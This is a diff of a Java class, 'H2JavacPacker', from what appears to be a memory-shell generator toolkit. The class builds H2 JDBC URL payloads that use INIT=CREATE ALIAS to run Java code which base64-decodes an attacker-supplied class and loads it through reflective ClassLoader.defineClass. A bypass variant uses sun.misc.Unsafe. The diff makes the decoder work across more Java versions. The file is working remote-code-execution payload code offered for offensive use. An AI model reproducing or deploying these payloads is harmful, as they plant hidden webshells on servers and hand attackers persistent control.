@@ -6,15 +6,25 @@ import org.leo.jmg.mem.packer.PackerMeta;
 
 @PackerMeta(name = "H2Javac", group = "H2", order = 1)
 public class H2JavacPacker implements Packer {
-    String template = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS look AS '" +
-            "String a(String a) throws java.lang.Throwable{" +
+    private static final String COMPATIBLE_BASE64_DECODE =
             "byte[] bytes=null\\;" +
             "String base64Str=\"{{base64Str}}\"\\;" +
-            "try {\n" +
-            "    bytes=java.util.Base64.getDecoder().decode(base64Str)\\;" +
-            "} catch (java.lang.Throwable var6) {\n" +
-            "    bytes = new sun.misc.BASE64Decoder().decodeBuffer(base64Str)\\;\n" +
-            "}" +
+            "try{" +
+            "java.lang.Class c=java.lang.Class.forName(\"java.util.Base64\")\\;" +
+            "java.lang.Object d=c.getMethod(\"getDecoder\",new java.lang.Class[0]).invoke(null,new java.lang.Object[0])\\;" +
+            "bytes=(byte[])d.getClass().getMethod(\"decode\",new java.lang.Class[]{java.lang.String.class}).invoke(d,new java.lang.Object[]{base64Str})\\;" +
+            "}catch(java.lang.Throwable first){try{" +
+            "java.lang.Class c=java.lang.Class.forName(\"javax.xml.bind.DatatypeConverter\")\\;" +
+            "bytes=(byte[])c.getMethod(\"parseBase64Binary\",new java.lang.Class[]{java.lang.String.class}).invoke(null,new java.lang.Object[]{base64Str})\\;" +
+            "}catch(java.lang.Throwable second){" +
+            "java.lang.Class c=java.lang.Class.forName(\"sun.misc.BASE64Decoder\")\\;" +
+            "java.lang.Object d=c.newInstance()\\;" +
+            "bytes=(byte[])c.getMethod(\"decodeBuffer\",new java.lang.Class[]{java.lang.String.class}).invoke(d,new java.lang.Object[]{base64Str})\\;" +
+            "}}";
+
+    String template = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS look AS '" +
+            "String a(String a) throws java.lang.Throwable{" +
+            COMPATIBLE_BASE64_DECODE +
             "java.lang.reflect.Method defMethod=java.lang.ClassLoader.class.getDeclaredMethod(\"defineClass\",bytes.getClass(),int.class,int.class)\\;" +
             "defMethod.setAccessible(true)\\;" +
             "java.lang.Class myclass=(java.lang.Class)defMethod.invoke(new java.net.URLClassLoader(new java.net.URL[0],java.lang.Thread.currentThread().getContextClassLoader()),bytes,0,bytes.length)\\;" +
@@ -24,8 +34,7 @@ public class H2JavacPacker implements Packer {
             "CALL look('')";
     String bypassTemplate = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS look AS '" +
             "String a(String a) throws java.lang.Throwable{" +
-            "String base64Str=\"{{base64Str}}\"\\;" +
-            "byte[] bytes=java.util.Base64.getDecoder().decode(base64Str)\\;" +
+            COMPATIBLE_BASE64_DECODE +
             "try {" +
             "    java.lang.Class<?> unsafeClass = Class.forName(\"sun.misc.Unsafe\")\\;" +
             "    java.lang.reflect.Field unsafeField = unsafeClass.getDeclaredField(\"theUnsafe\")\\;" +
